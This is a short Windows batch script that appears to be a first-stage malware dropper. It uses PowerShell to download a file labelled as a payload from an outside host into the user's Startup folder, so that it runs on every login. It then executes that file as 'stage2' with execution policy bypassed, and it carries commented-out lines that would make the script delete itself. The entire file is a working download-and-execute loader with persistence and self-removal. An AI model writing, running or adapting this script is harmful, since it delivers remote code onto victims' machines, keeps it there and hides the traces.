@echo off

SET currentDirectory=%cd%

SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %STARTUPPATH%


    @REM download the payload
    powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/popup.cmd' -OutFile 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'


    @REM run stage2
    powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"


@rem uncomment to make the script delete itself
@REM cd %currentDirectory%
@rem del initial.bat

